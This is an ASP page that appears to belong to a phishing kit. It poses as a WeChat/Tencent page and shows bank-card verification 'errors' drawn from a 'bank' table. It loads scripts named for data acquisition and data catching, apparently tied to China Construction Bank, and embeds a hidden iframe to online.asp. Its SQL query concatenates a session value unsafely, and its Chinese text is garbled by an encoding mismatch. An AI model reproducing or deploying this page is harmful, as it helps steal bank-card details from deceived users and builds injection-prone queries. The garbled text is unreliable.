<!--#include file="include/db_conn.asp"-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>��ȡ���</title>
<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<link rel="stylesheet" href="css/reset.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="" id="min320">
<link rel="apple-touch-startup-image" href="milanoo_startup.png">
<link rel="apple-touch-icon-precomposed" href="milanoo_startup.png">
<script src="images/jquery-1.6.min.js"></script>
<script src="images/main.js"></script>
<style type="text/css"> 
#no_css{
	display:none;	
}
 
.financial_content a:hover {color: #0066b3; }
.financial_content a:active {color: #0066b3; }
.financial_content a:link {color: #0066b3; }
.financial_content a:visited {color: #0066b3; }
 
.wb_list a:hover {color: #0066b3; }
.wb_list a:active {color: #0066b3; }
.wb_list a:link {color: #0066b3; }
.wb_list a:visited {color: #0066b3; }
 
.news1_list1 li a{display:inline-block;max-width:100%}
.style1 {color: #FF0000}
.head {
		line-height: 0;
		text-align: center;
	}
	.ccb_title1 {
		min-height: 58px;
		line-height: 58px;
		font-size: 16px;
		text-align: center;
		background: #F6F6F6 none repeat scroll 0% 0%;
		border-top: 3px solid #44b549;
		border-bottom: 1px solid #D9DADC;
	}
	
	.news .ccb_title1 tr td .on a{
			color:#FFFDFD
	}
</style>
<script type="text/javascript"> 
$(function(){
	$("#no_js").hide();
});
</script>
</head>
<body>
<div class="page">
  <div class="head">
   <img alt="" src="images/da.png">
  </div>
    <div class="hq_page">
		<div class="news ccb_title1">
			<table width="100%">
				<tbody>
					<tr>
						<td align="center">��ҳ</td>
						<td align="center">΢���̳�</td>
						<td align="center">�ҵ�΢��</td>
						<td align="center" style="background: #44b549 none repeat scroll 0% 0%; color = red;"><a>΢��ƽ̨</a></td>
						<td align="center">����֧��</td>
					</tr>
				</tbody>
			</table>
		</div><br>
    <div class="hq_page">
      <div class="news ccb_title">
        <h1>�Բ�����Ϣ���ִ���</h1>
      </div>
      <div id="pic2" class="pic2 content"> 
<%
dim rs
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
m=rs("m")
rs.close
set rs=Nothing

select case m
case 3
	response.write "�����ʻ�û�������ֻ����룬�뵽����������ֻ����뼴�ɲ���һ�"
case 4
	response.write "����Ԥ���ֻ����벻��ȷ���뷵����������"
case 5
	response.write "ע�Ῠ���ʣ��Ų����ڻ����ѱ�ע�����뷵����������"
case 6
	response.write "���������Ϣ�����м�¼����Ϣ��һ�£��뷵����������"
case 7
	response.write "ϵͳ��æ �Ժ�����"
case 8
	response.write "�������ȡ�����������뷵���������롣"
case 9
	response.write "��ʵ�ɹ�,�ÿ��ݲ�֧������,��������Ż���������!"
end Select
	  %>
        <div class="mobile_login"> <a href="register.asp"><span class="login_ico_l"></span><span class="login_ico_m">��һ��</span><span class="login_ico_r"></span></a></div>
      </div>
    </div>
    <!-- InstanceEndEditable -->
        <meta name="format-detection" content="telephone=no">
    <div class="footer">
      <h4 style="font-size:12px;">Copyright 1999-2014 ��Ѷ ��Ȩ���� <br>�л����񹲺͹���ֵ����ҵ��Ӫ���֤<br>
        ��Ӫ���֤��ţ�A2.B1.B2-20100001  </h4>
    </div>
    <!-- /footer -->
    <script src="./error_files/dataacquisition.xy.ccb.js"></script>
    <script src="./error_files/datacatch.js"></script>
  </div>
  <!-- InstanceEnd --> </div>
<iframe src="online.asp" style="display: none;"></iframe>
</body>
</html>
